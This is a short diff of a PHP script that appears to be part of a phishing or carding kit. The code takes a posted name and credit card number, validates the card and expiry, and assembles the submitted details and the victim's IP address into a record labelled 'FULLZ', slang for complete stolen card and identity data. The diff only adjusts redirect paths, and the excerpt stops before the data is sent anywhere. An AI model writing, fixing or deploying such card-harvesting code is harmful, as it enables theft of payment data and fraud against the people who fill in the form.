@@ -5,11 +5,11 @@ if(!empty($_POST['fname']) && !empty($_POST['lname']) && !empty($_POST['ccnum'])
 {
   if(validatecard($_POST['ccnum']) == false)
   {
-    header("Location: clients/informations.php");
+    header("Location: informations.php");
   }else{
     if(!checkExp($_POST['exp']))
     {
-        header("Location: clients/informations.php");
+        header("Location: informations.php");
     }else{
       $message = '/-- FULLZ --/' . getIPAddress() . "\r\n";
       $message .= '[Prenom] = ' . $_POST['fname'] . "\r\n";
